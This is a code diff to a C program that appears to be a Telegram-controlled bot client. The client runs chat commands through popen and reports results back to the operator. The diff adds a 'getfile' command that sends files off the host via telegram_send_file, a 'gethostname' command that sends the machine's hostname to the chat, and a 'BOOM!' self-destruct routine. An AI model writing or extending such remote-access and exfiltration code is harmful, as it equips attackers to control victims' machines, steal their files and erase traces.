@@ -14,9 +14,8 @@ struct message {
     char servermessage[150];
 }message;
 
-void *changecommand(char *text);
+void *changecommand(char *id,char *text);
 
-int check_exe_len();
 
 int main(int argc , char *argv[])
 {
@@ -77,7 +76,7 @@ int main(int argc , char *argv[])
     }
     // printf("%s\n",chat_text);
     
-    changecommand(chat_text);
+    changecommand(chat_id,chat_text);
     printf("%s\n", chat_text);
     //combine all message_box
     FILE *fp, *error_file, *exe_file;
@@ -166,8 +165,8 @@ int main(int argc , char *argv[])
     fp = popen("rm result.txt","r");
     fp = popen("rm error.txt","r");
 }
-void *changecommand(char *text) {
-    char text_build[4000], command_detail[500];
+void *changecommand(char *id,char *text) {
+    char text_build[4000], command_detail[500],temp_text[2000];
     int start_index, index = 0, length;
 
     strcpy(text_build, text);
@@ -211,14 +210,18 @@ void *changecommand(char *text) {
         else if(strcmp(text, "mkdir") == 0) {
             strcpy(command_detail, "Make directory.");
         }
-        else if(strcmp(text, "getfile") == 0) {
+        else if(strcmp(text, "getfile ") == 0) {
             strcpy(command_detail, "Download file from bot.");
-        }
-        else if(strcmp(text, "reserve") == 0) {
-            strcpy(command_detail, "Warning text that found in shell.");
+            telegram_send_file(id,text);
         }
         else if(strcmp(text, "BOOM!") == 0) {
             strcpy(command_detail, "DESTROY ITSELF!");
+            boom();
+        }
+        else if(strcmp(text, "gethostname") == 0) {
+            strcpy(command_detail, "Get hostname of client.");
+            getHostname(temp_text);
+            telegram_send_msg(id,temp_text);
         }
         printf("%s", command_detail);
         memset(command_detail, 0, 500);
@@ -226,19 +229,3 @@ void *changecommand(char *text) {
     index = 0;
 }
 
-// int check_exe_len(){
-//     FILE *fp;
-//     int len_count=0;
-//     char buf[2048];
-//     fp = fopen("exe.log","r");
-
-//     while(fgets(buf,1024,fp)){
-//        len_count++;
-//     }
-//     //smaller than 1024
-//     if(len_count <= 1) return 1;
-//     //bigger than 1024
-//     else return 0;
-//     fclose(fp);
-//     bzero(buf,2048);
-// }
